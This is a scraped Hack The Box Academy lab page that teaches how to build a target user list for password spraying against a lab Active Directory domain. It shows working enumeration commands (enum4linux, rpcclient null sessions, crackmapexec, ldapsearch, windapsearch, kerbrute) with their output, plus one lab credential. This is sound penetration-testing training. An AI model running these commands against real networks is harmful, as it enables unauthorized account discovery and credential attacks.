<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/143/section/1455
// Platform Version: V1
// Module ID: 143
// Module Name: Active Directory Enumeration & Attacks
// Module Difficulty: Medium
// Section ID: 1455
// Section Title: Password Spraying - Making a Target User List
// Page Title: Hack The Box - Academy
// Page Number: 10
-->

# Password Spraying - Making a Target User List

**Module Name:** Active Directory Enumeration & Attacks **Page Number:** 10

#### 

#### ACTIVE DIRECTORY ENUMERATION & ATTACKS

# Password Spraying - Making a Target User List

## Detailed User Enumeration

## SMB NULL Session to Pull User List

#### Using enum4linux

``` shell-session
[!bash!]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>
```

#### Using rpcclient

``` shell-session
[!bash!]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>
```

#### Using CrackMapExec --users Flag

``` shell-session
[!bash!]$ crackmapexec smb 172.16.5.5 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613

<SNIP>
```

## Gathering Users with LDAP Anonymous

#### Using ldapsearch

``` shell-session
[!bash!]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>
```

#### Using windapsearch

``` shell-session
[!bash!]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users: 

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local

cn: Fae Anthony
userPrincipalName: fanthony@inlanefreight.local

cn: Walter Dillard
userPrincipalName: wdillard@inlanefreight.local

<SNIP>
```

## Enumerating Users with Kerbrute

#### Kerbrute User Enumeration

``` shell-session
[!bash!]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local

<SNIP>
```

## Credentialed Enumeration to Build our User List

#### Using CrackMapExec with Valid Credentials

``` shell-session
[!bash!]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

[sudo] password for htb-student: 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD! 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58

<SNIP>
```

## Now for the Fun

# 

# 

#### Questions

####